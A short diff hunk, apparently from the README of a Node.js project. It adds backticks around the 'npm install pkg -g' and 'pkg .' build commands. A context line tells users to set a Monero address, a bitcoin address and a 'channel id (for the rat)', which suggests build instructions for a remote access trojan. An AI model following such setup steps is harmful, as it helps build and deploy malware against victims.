@@ -58,6 +58,8 @@ Edit index and edit the options (xmr adress, channel id (for the rat), bitcoin a
 
 `
 npm install pkg -g
+`
+`
 pkg .
 `
 
